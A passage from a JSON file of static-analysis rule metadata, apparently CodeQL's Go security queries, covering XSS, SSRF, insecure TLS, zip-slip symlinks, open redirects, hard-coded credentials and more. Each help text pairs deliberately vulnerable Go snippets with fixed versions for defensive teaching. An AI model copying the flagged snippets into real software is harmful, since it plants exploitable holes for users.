\"github.com/Masterminds/squirrel\"\n)\n\nfunc saveGood(id string, version interface{}) {\n\tversionJSON, _ := json.Marshal(version)\n\tsq.StatementBuilder.\n\t\tInsert(\"resources\").\n\t\tColumns(\"resource_id\", \"version_md5\").\n\t\tValues(id, sq.Expr(\"md5(?)\", versionJSON)).\n\t\tExec()\n}\n\n```\nIn situations where a structured API is not available, make sure that you escape quotes before embedding user-provided data into a quoted string. For example, this is how you can backslash-escape single quotes using `strings.ReplaceAll`:\n\n```go\n\n  quoted := strings.ReplaceAll(raw, `\\`, `\\\\`)\n  quoted = strings.ReplaceAll(quoted, \"'\", \"\\\\'\")\n\n```\nNote that any existing backslash characters in the string must be escaped first, so that they do not interfere with the escaping of single quotes.\n\nIn some cases, `strconv.Quote` is a convenient option for backslash escaping, but note that it has two limitations:\n\n1. It only supports double quotes, not single quotes (as in the example).\n1. It puts quotes around the entire string, so it can only be used to construct complete string literals, not parts of larger string literals.\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "go/stored-xss": {
    "name": "Stored cross-site scripting",
    "description": "Using uncontrolled stored values in HTML allows for a stored cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "precision": "low",
    "id": "go/stored-xss",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116"
    ],
    "filename": "5f9d931a-StoredXss",
    "language": "go",
    "help": "# Stored cross-site scripting\nDirectly using externally-controlled stored values (for example, file names or database contents) to create HTML content without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *stored* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before using uncontrolled stored values to create HTML content, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example code writes file names directly to an HTTP response. This leaves the website vulnerable to cross-site scripting, if an attacker can choose the file names on the disk.\n\n\n```go\npackage main\n\nimport (\n\t\"io\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\nfunc ListFiles(w http.ResponseWriter, r *http.Request) {\n\tfiles, _ := ioutil.ReadDir(\".\")\n\n\tfor _, file := range files {\n\t\tio.WriteString(w, file.Name()+\"\\n\")\n\t}\n}\n\n```\nSanitizing the file names prevents the vulnerability:\n\n\n```go\npackage main\n\nimport (\n\t\"html\"\n\t\"io\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\nfunc ListFiles1(w http.ResponseWriter, r *http.Request) {\n\tfiles, _ := ioutil.ReadDir(\".\")\n\n\tfor _, file := range files {\n\t\tio.WriteString(w, html.EscapeString(file.Name())+\"\\n\")\n\t}\n}\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP: [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "go/insecure-tls": {
    "name": "Insecure TLS configuration",
    "description": "If an application supports insecure TLS versions or ciphers, it may be vulnerable to machine-in-the-middle and other attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "very-high",
    "id": "go/insecure-tls",
    "tags": [
      "security",
      "external/cwe/cwe-327"
    ],
    "filename": "db4233b9-InsecureTLS",
    "language": "go",
    "help": "# Insecure TLS configuration\nThe TLS (Transport Layer Security) protocol secures communications over the Internet. The protocol allows client/server applications to communicate in a way that is designed to prevent eavesdropping, tampering, or message forgery.\n\nThe current latest version is 1.3 (with the 1.2 version still being considered secure). Older versions are not deemed to be secure anymore because of various security vulnerabilities, and tht makes them unfit for use in securing your applications.\n\nUnfortunately, many applications and websites still support deprecated SSL/TLS versions and cipher suites.\n\n\n## Recommendation\nOnly use secure TLS versions (1.3 and 1.2) and avoid using insecure cipher suites (you can see a list here: https://golang.org/src/crypto/tls/cipher_suites.go\\#L81)\n\n\n## Example\nThe following example shows a few ways how an insecure TLS configuration can be created:\n\n\n```go\npackage main\n\nimport (\n\t\"crypto/tls\"\n)\n\nfunc main() {}\n\nfunc insecureMinMaxTlsVersion() {\n\t{\n\t\tconfig := &tls.Config{}\n\t\tconfig.MinVersion = 0 // BAD: Setting the MinVersion to 0 equals to choosing the lowest supported version (i.e. SSL3.0)\n\t}\n\t{\n\t\tconfig := &tls.Config{}\n\t\tconfig.MinVersion = tls.VersionSSL30 // BAD: SSL 3.0 is a non-secure version of the protocol; it's not safe to use it as MinVersion.\n\t}\n\t{\n\t\tconfig := &tls.Config{}\n\t\tconfig.MaxVersion = tls.VersionSSL30 // BAD: SSL 3.0 is a non-secure version of the protocol; it's not safe to use it as MaxVersion.\n\t}\n}\n\nfunc insecureCipherSuites() {\n\tconfig := &tls.Config{\n\t\tCipherSuites: []uint16{\n\t\t\ttls.TLS_RSA_WITH_RC4_128_SHA, // BAD: TLS_RSA_WITH_RC4_128_SHA is one of the non-secure cipher suites; it's not safe to be used.\n\t\t},\n\t}\n\t_ = config\n}\n\n```\nThe following example shows how to create a safer TLS configuration:\n\n\n```go\npackage main\n\nimport \"crypto/tls\"\n\nfunc saferTLSConfig() {\n\tconfig := &tls.Config{}\n\tconfig.MinVersion = tls.VersionTLS12\n\tconfig.MaxVersion = tls.VersionTLS13\n\t// OR\n\tconfig.MaxVersion = 0 // GOOD: Setting MaxVersion to 0 means that the highest version available in the package will be used.\n}\n\n```\n\n## References\n* Wikipedia: [Transport Layer Security](https://en.wikipedia.org/wiki/Transport_Layer_Security)\n* Mozilla: [Security/Server Side TLS](https://wiki.mozilla.org/Security/Server_Side_TLS)\n* OWASP: [Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n"
  },
  "go/allocation-size-overflow": {
    "name": "Size computation for allocation may overflow",
    "description": "When computing the size of an allocation based on the size of a large object, the result may overflow and cause a runtime panic.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "high",
    "id": "go/allocation-size-overflow",
    "tags": [
      "security",
      "external/cwe/cwe-190"
    ],
    "filename": "eed37617-AllocationSizeOverflow",
    "language": "go",
    "help": "# Size computation for allocation may overflow\nPerforming calculations involving the size of potentially large strings or slices can result in an overflow (for signed integer types) or a wraparound (for unsigned types). An overflow causes the result of the calculation to become negative, while a wraparound results in a small (positive) number.\n\nThis can cause further issues. If, for example, the result is then used in an allocation, it will cause a runtime panic if it is negative, and allocate an unexpectedly small buffer otherwise.\n\n\n## Recommendation\nAlways guard against overflow in arithmetic operations involving potentially large numbers by doing one of the following:\n\n* Validate the size of the data from which the numbers are computed.\n* Define a guard on the arithmetic expression, so that the operation is performed only if the result can be known to be less than, or equal to, the maximum value for the type.\n* Use a wider type (such as `uint64` instead of `int`), so that larger input values do not cause overflow.\n\n## Example\nIn the following example, assume that there is a function `encryptBuffer` that encrypts byte slices whose length must be padded to be a multiple of 16. The function `encryptValue` provides a convenience wrapper around this function: when passed an arbitrary value, it first encodes that value as JSON, pads the resulting byte slice, and then passes it to `encryptBuffer`.\n\n\n```go\npackage main\n\nimport \"encoding/json\"\n\nfunc encryptValue(v interface{}) ([]byte, error) {\n\tjsonData, err := json.Marshal(v)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tsize := len(jsonData) + (len(jsonData) % 16)\n\tbuffer := make([]byte, size)\n\tcopy(buffer, jsonData)\n\treturn encryptBuffer(buffer)\n}\n\n```\nWhen passed a value whose JSON encoding is close to the maximum value of type `int` in length, the computation of `size` will overflow, producing a negative value. When that negative value is passed to `make`, a runtime panic will occur.\n\nTo guard against this, the function should be improved to check the length of the JSON-encoded value. For example, here is a version of `encryptValue` that ensures the value is no larger than 64 MB, which fits comfortably within an `int` and avoids the overflow:\n\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"errors\"\n)\n\nfunc encryptValueGood(v interface{}) ([]byte, error) {\n\tjsonData, err := json.Marshal(v)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif len(jsonData) > 64*1024*1024 {\n\t\treturn nil, errors.New(\"value too large\")\n\t}\n\tsize := len(jsonData) + (len(jsonData) % 16)\n\tbuffer := make([]byte, size)\n\tcopy(buffer, jsonData)\n\treturn encryptBuffer(buffer)\n}\n\n```\n\n## References\n* The Go Programming Language Specification: [Integer overflow](https://golang.org/ref/spec#Integer_overflow).\n* The Go Programming Language Specification: [Making slices, maps and channels](https://golang.org/ref/spec#Making_slices_maps_and_channels).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n"
  },
  "go/constant-oauth2-state": {
    "name": "Use of constant `state` value in OAuth 2.0 URL",
    "description": "Using a constant value for the `state` in the OAuth 2.0 URL makes the application susceptible to CSRF attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "high",
    "id": "go/constant-oauth2-state",
    "tags": [
      "security",
      "external/cwe/cwe-352"
    ],
    "filename": "af7cd863-ConstantOauth2State",
    "language": "go",
    "help": "# Use of constant `state` value in OAuth 2.0 URL\nOAuth 2.0 clients must implement CSRF protection for the redirection URI, which is typically accomplished by including a \"state\" value that binds the request to the user's authenticated state. The Go OAuth 2.0 library allows you to specify a \"state\" value which is then included in the auth code URL. That state is then provided back by the remote authentication server in the redirect callback, from where it must be validated. Failure to do so makes the client susceptible to an CSRF attack.\n\n\n## Recommendation\nAlways include a unique, non-guessable `state` value (provided to the call to `AuthCodeURL` function) that is also bound to the user's authenticated state with each authentication request, and then validated in the redirect callback.\n\n\n## Example\nThe first example shows you the use of a constant state (bad).\n\n\n```go\npackage main\n\nimport (\n\t\"golang.org/x/oauth2\"\n)\n\nfunc main() {}\n\nvar stateStringVar = \"state\"\n\nfunc badWithStringLiteralState() {\n\tconf := &oauth2.Config{\n\t\tClientID:     \"YOUR_CLIENT_ID\",\n\t\tClientSecret: \"YOUR_CLIENT_SECRET\",\n\t\tScopes:       []string{\"SCOPE1\", \"SCOPE2\"},\n\t\tEndpoint: oauth2.Endpoint{\n\t\t\tAuthURL:  \"https://provider.com/o/oauth2/auth\",\n\t\t\tTokenURL: \"https://provider.com/o/oauth2/token\",\n\t\t},\n\t}\n\n\turl := conf.AuthCodeURL(stateStringVar)\n\t// ...\n}\n\n```\nThe second example shows a better implementation idea.\n\n\n```go\npackage main\n\nimport (\n\t\"crypto/rand\"\n\t\"encoding/base64\"\n\t\"net/http\"\n\n\t\"golang.org/x/oauth2\"\n)\n\nfunc betterWithVariableStateReturned(w http.ResponseWriter) {\n\tconf := &oauth2.Config{\n\t\tClientID:     \"YOUR_CLIENT_ID\",\n\t\tClientSecret: \"YOUR_CLIENT_SECRET\",\n\t\tScopes:       []string{\"SCOPE1\", \"SCOPE2\"},\n\t\tEndpoint: oauth2.Endpoint{\n\t\t\tAuthURL:  \"https://provider.com/o/oauth2/auth\",\n\t\t\tTokenURL: \"https://provider.com/o/oauth2/token\",\n\t\t},\n\t}\n\n\tstate := generateStateOauthCookie(w)\n\turl := conf.AuthCodeURL(state)\n\t_ = url\n\t// ...\n}\nfunc generateStateOauthCookie(w http.ResponseWriter) string {\n\tb := make([]byte, 128)\n\trand.Read(b)\n\t// TODO: save the state string to cookies or HTML storage,\n\t// and bind it to the authenticated status of the user.\n\tstate := base64.URLEncoding.EncodeToString(b)\n\n\treturn state\n}\n\n```\n\n## References\n* IETF: [The OAuth 2.0 Authorization Framework](https://tools.ietf.org/html/rfc6749#section-10.12)\n* IETF: [OAuth 2.0 Security Best Current Practice](https://tools.ietf.org/html/draft-ietf-oauth-security-topics-15#section-2.1)\n* Common Weakness Enumeration: [CWE-352](https://cwe.mitre.org/data/definitions/352.html).\n"
  },
  "go/untrusted-data-to-unknown-external-api": {
    "name": "Untrusted data passed to unknown external API",
    "description": "Data provided remotely is used in this unknown external API without sanitization, which could be a security risk.",
    "id": "go/untrusted-data-to-unknown-external-api",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "7581a5e3-UntrustedDataToUnknownExternalAPI",
    "language": "go",
    "help": "# Untrusted data passed to unknown external API\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results have been filtered to only report unknown external APIs. The query provides data for security reviews of the application. It can also be used to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a call to a function that is not defined in the source code and is not modeled as a taint step in the default taint library. Calls made in test files are excluded. External APIs may be from the Go standard library, third-party dependencies, or from internal dependencies. The query reports uses of untrusted data in either the receiver or as one of the arguments of external APIs.\n\nAn external API is considered unknown if it is not in a package which has already been modeled, it is not a sink for an existing query, and it is not in a list of external APIs which have been examined and determined to not be a possible source of security vulnerabilities.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint (for example, from a parameter to its return value), add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, a request parameter is read from `http.Request` and then ultimately used in a call to the `fmt.Fprintf` external API:\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tusername := r.Form.Get(\"username\")\n\t\tif !isValidUsername(username) {\n\t\t\t// BAD: a request parameter is incorporated without validation into the response\n\t\t\tfmt.Fprintf(w, \"%q is an unknown user\", username)\n\t\t} else {\n\t\t\t// TODO: Handle successful login\n\t\t}\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\nThis is an XSS sink. The \"Reflected cross-site scripting\" query (`go/reflected-xss`) should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a request parameter is read from `http.Request`.\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(db *sql.DB, req *http.Request) {\n\tq := fmt.Sprintf(\"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='%s' ORDER BY PRICE\",\n\t\treq.URL.Query()[\"category\"])\n\tdb.Query(q)\n}\n\n```\nIf the query reported the call to `fmt.Sprintf`, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, an SQL injection vulnerability would be reported.\n\nNote that both examples are correctly handled by the standard taint tracking library, the \"Reflected cross-site scripting\" query (`go/reflected-xss`), and the \"Database query built from user-controlled sources\" query (`go/sql-injection`).\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "go/untrusted-data-to-external-api": {
    "name": "Untrusted data passed to external API",
    "description": "Data provided remotely is used in this external API without sanitization, which could be a security risk.",
    "id": "go/untrusted-data-to-external-api",
    "kind": "path-problem",
    "precision": "low",
    "problem.severity": "error",
    "security-severity": 7.8,
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "7581a5e3-UntrustedDataToExternalAPI",
    "language": "go",
    "help": "# Untrusted data passed to external API\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results have very little filtering so that you can audit almost all examples. The query provides data for security reviews of the application. It can also be used to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.\n\nAn external API is defined as a call to a function that is not defined in the source code and is not modeled as a taint step in the default taint library. Calls made in test files are excluded. External APIs may be from the Go standard library, third-party dependencies, or from internal dependencies. The query reports uses of untrusted data in either the receiver or as one of the arguments of external APIs.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.\n* If the result represents a call to an external API that transfers taint (for example, from a parameter to its return value), add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIn this first example, a request parameter is read from `http.Request` and then ultimately used in a call to the `fmt.Fprintf` external API:\n\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc serve() {\n\thttp.HandleFunc(\"/user\", func(w http.ResponseWriter, r *http.Request) {\n\t\tr.ParseForm()\n\t\tusername := r.Form.Get(\"username\")\n\t\tif !isValidUsername(username) {\n\t\t\t// BAD: a request parameter is incorporated without validation into the response\n\t\t\tfmt.Fprintf(w, \"%q is an unknown user\", username)\n\t\t} else {\n\t\t\t// TODO: Handle successful login\n\t\t}\n\t})\n\thttp.ListenAndServe(\":80\", nil)\n}\n\n```\nThis is an XSS sink. The \"Reflected cross-site scripting\" query (`go/reflected-xss`) should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.\n\nIn this second example, again a request parameter is read from `http.Request`.\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(db *sql.DB, req *http.Request) {\n\tq := fmt.Sprintf(\"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='%s' ORDER BY PRICE\",\n\t\treq.URL.Query()[\"category\"])\n\tdb.Query(q)\n}\n\n```\nIf the query reported the call to `fmt.Sprintf`, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, an SQL injection vulnerability would be reported.\n\nNote that both examples are correctly handled by the standard taint tracking library, the \"Reflected cross-site scripting\" query (`go/reflected-xss`), and the \"Database query built from user-controlled sources\" query (`go/sql-injection`).\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "go/unsafe-unzip-symlink": {
    "name": "Arbitrary file write extracting an archive containing symbolic links",
    "description": "Extracting files from a malicious zip archive without validating that the destination file path is within the destination directory can cause files outside the destination directory to be overwritten. Extracting symbolic links in particular requires resolving previously extracted links to ensure the destination directory is not escaped.",
    "kind": "path-problem",
    "id": "go/unsafe-unzip-symlink",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "tags": [
      "security",
      "external/cwe/cwe-022"
    ],
    "filename": "011318e1-UnsafeUnzipSymlink",
    "language": "go",
    "help": "# Arbitrary file write extracting an archive containing symbolic links\nExtracting symbolic links from a malicious zip archive, without validating that the destination file path is within the destination directory, can cause files outside the destination directory to be overwritten. This can happen if there are previously-extracted symbolic links or directory traversal elements and links (`..`) in archive paths.\n\nThis problem is related to the ZipSlip vulnerability which is detected by the `go/zipslip` query; please see that query's help for more general information about malicious archive file vulnerabilities. This query considers the specific case where symbolic links are extracted from an archive, in which case the extraction code must be aware of existing symbolic links when checking whether it is about to extract a link pointing to a location outside the target extraction directory.\n\n\n## Recommendation\nEnsure that output paths constructed from zip archive entries are validated. This includes resolving any previously extracted symbolic links, for example using `path/filepath.EvalSymlinks`, to prevent writing files or links to unexpected locations.\n\n\n## Example\nIn this example, links are extracted from an archive using the syntactic `filepath.Rel` function to check whether the link and its target fall within the destination directory. However, the extraction code doesn't resolve previously-extracted links, so a pair of links like `subdir/parent -> ..` followed by `escape -> subdir/parent/.. -> subdir/../..` leaves a link pointing to the parent of the archive root. The syntactic `Rel` is ineffective because it equates `subdir/parent/..` with `subdir/`, but this is not the case when `subdir/parent` is a symbolic link.\n\n\n```go\npackage main\n\nimport (\n\t\"archive/tar\"\n\t\"io\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"strings\"\n)\n\nfunc isRel(candidate, target string) bool {\n\t// BAD: purely syntactic means are used to check\n\t// that `candidate` does not escape from `target`\n\tif filepath.IsAbs(candidate) {\n\t\treturn false\n\t}\n\trelpath, err := filepath.Rel(target, filepath.Join(target, candidate))\n\treturn err == nil && !strings.HasPrefix(filepath.Clean(relpath), \"..\")\n}\n\nfunc unzipSymlink(f io.Reader, target string) {\n\tr := tar.NewReader(f)\n\tfor {\n\t\theader, err := r.Next()\n\t\tif err != nil {\n\t\t\tbreak\n\t\t}\n\t\tif isRel(header.Linkname, target) && isRel(header.Name, target) {\n\t\t\tos.Symlink(header.Linkname, header.Name)\n\t\t}\n\t}\n}\n\n```\nTo fix this vulnerability, resolve pre-existing symbolic links before checking that the link's target is acceptable:\n\n\n```go\npackage main\n\nfunc isRel(candidate, target string) bool {\n\t// GOOD: resolves all symbolic links before checking\n\t// that `candidate` does not escape from `target`\n\tif filepath.IsAbs(candidate) {\n\t\treturn false\n\t}\n\trealpath, err := filepath.EvalSymlinks(filepath.Join(target, candidate))\n\tif err != nil {\n\t\treturn false\n\t}\n\trelpath, err := filepath.Rel(target, realpath)\n\treturn err == nil && !strings.HasPrefix(filepath.Clean(relpath), \"..\")\n}\n\n```\n\n## References\n* Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n"
  },
  "go/request-forgery": {
    "name": "Uncontrolled data used in network request",
    "description": "Sending network requests with user-controlled data allows for request forgery attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.1,
    "precision": "high",
    "id": "go/request-forgery",
    "tags": [
      "security",
      "external/cwe/cwe-918"
    ],
    "filename": "833bd0e0-RequestForgery",
    "language": "go",
    "help": "# Uncontrolled data used in network request\nDirectly incorporating user input into an HTTP request without validating the input can facilitate different kinds of request forgery attacks, where the attacker essentially controls the request. If the vulnerable request is in server-side code, then security mechanisms, such as external firewalls, can be bypassed. If the vulnerable request is in client-side code, then unsuspecting users can send malicious requests to other servers, potentially resulting in a DDOS attack.\n\n\n## Recommendation\nTo guard against request forgery, it is advisable to avoid putting user input directly into a network request. If a flexible network request mechanism is required, it is recommended to maintain a list of authorized request targets and choose from that list based on the user input provided.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL request without validating the input, which facilitates an SSRF attack. The request `http.Get(...)` is vulnerable since attackers can choose the value of `target` to be anything they want. For instance, the attacker can choose `\"internal.example.com/#\"` as the target, causing the URL used in the request to be `\"https://internal.example.com/#.example.com/data\"`.\n\nA request to `https://internal.example.com` may be problematic if that server is not meant to be directly accessible from the attacker's machine.\n\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, req *http.Request) {\n\ttarget := req.FormValue(\"target\")\n\n\t// BAD: `target` is controlled by the attacker\n\tresp, err := http.Get(\"https://\" + target + \".example.com/data/\")\n\tif err != nil {\n\t\t// error handling\n\t}\n\n\t// process request response\n\tuse(resp)\n}\n\n```\nOne way to remedy the problem is to use the user input to select a known fixed string before performing the request:\n\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n)\n\nfunc handler1(w http.ResponseWriter, req *http.Request) {\n\ttarget := req.FormValue(\"target\")\n\n\tvar subdomain string\n\tif target == \"EU\" {\n\t\tsubdomain = \"europe\"\n\t} else {\n\t\tsubdomain = \"world\"\n\t}\n\n\t// GOOD: `subdomain` is controlled by the server\n\tresp, err := http.Get(\"https://\" + subdomain + \".example.com/data/\")\n\tif err != nil {\n\t\t// error handling\n\t}\n\n\t// process request response\n\tuse(resp)\n}\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* Common Weakness Enumeration: [CWE-918](https://cwe.mitre.org/data/definitions/918.html).\n"
  },
  "go/bad-redirect-check": {
    "name": "Bad redirect check",
    "description": "A redirect check that checks for a leading slash but not two leading slashes or a leading slash followed by a backslash is incomplete.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "id": "go/bad-redirect-check",
    "tags": [
      "security",
      "external/cwe/cwe-601"
    ],
    "precision": "high",
    "filename": "6c31d3d7-BadRedirectCheck",
    "language": "go",
    "help": "# Bad redirect check\nRedirect URLs should be checked to ensure that user input cannot cause a site to redirect to arbitrary domains. This is often done with a check that the redirect URL begins with a slash, which most of the time is an absolute redirect on the same host. However, browsers interpret URLs beginning with `//` or `/\\` as absolute URLs. For example, a redirect to `//example.com` will redirect to `https://example.com`. Thus, redirect checks must also check the second character of redirect URLs.\n\n\n## Recommendation\nAlso disallow redirect URLs starting with `//` or `/\\`.\n\n\n## Example\nThe following function validates a (presumably untrusted) redirect URL `redir`. If it does not begin with `/`, the harmless placeholder redirect URL `/` is returned to prevent an open redirect; otherwise `redir` itself is returned.\n\n\n```go\npackage main\n\nfunc sanitizeUrl(redir string) string {\n\tif len(redir) > 0 && redir[0] == '/' {\n\t\treturn redir\n\t}\n\treturn \"/\"\n}\n\n```\nWhile this check provides partial protection, it should be extended to cover `//` and `/\\` as well:\n\n\n```go\npackage main\n\nfunc sanitizeUrl1(redir string) string {\n\tif len(redir) > 1 && redir[0] == '/' && redir[1] != '/' && redir[1] != '\\\\' {\n\t\treturn redir\n\t}\n\treturn \"/\"\n}\n\n```\n\n## References\n* OWASP: [ XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html#validating-urls).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "go/hardcoded-credentials": {
    "name": "Hard-coded credentials",
    "description": "Hard-coding credentials in source code may enable an attacker to gain unauthorized access.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "medium",
    "id": "go/hardcoded-credentials",
    "tags": [
      "security",
      "external/cwe/cwe-259",
      "external/cwe/cwe-321",
      "external/cwe/cwe-798"
    ],
    "filename": "babf3967-HardcodedCredentials",
    "language": "go",
    "help": "# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\n\n## Example\nThe following code example connects to a Postgres database using the `lib/pq` package and hard-codes user name and password:\n\n\n```go\npackage main\n\nimport (\n\t\"database/sql\"\n\t\"fmt\"\n\n\t_ \"github.com/lib/pq\"\n)\n\nconst (\n\tuser     = \"dbuser\"\n\tpassword = \"s3cretp4ssword\"\n)\n\nfunc connect() *sql.DB {\n\tconnStr := fmt.Sprintf(\"postgres://%s:%s@localhost/pqgotest\", user, password)\n\tdb, err := sql.Open(\"postgres\", connStr)\n\tif err != nil {\n\t\treturn nil\n\t}\n\treturn db\n}\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "go/weak-crypto-key": {
    "name": "Use of a weak cryptographic key",
    "description": "Using a weak cryptographic key can allow an attacker to compromise security.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "go/weak-crypto-key",
    "tags": [
      "security",
      "external/cwe/cwe-326"
    ],
    "filename": "0ca1a2e5-InsufficientKeySize",
    "language": "go",
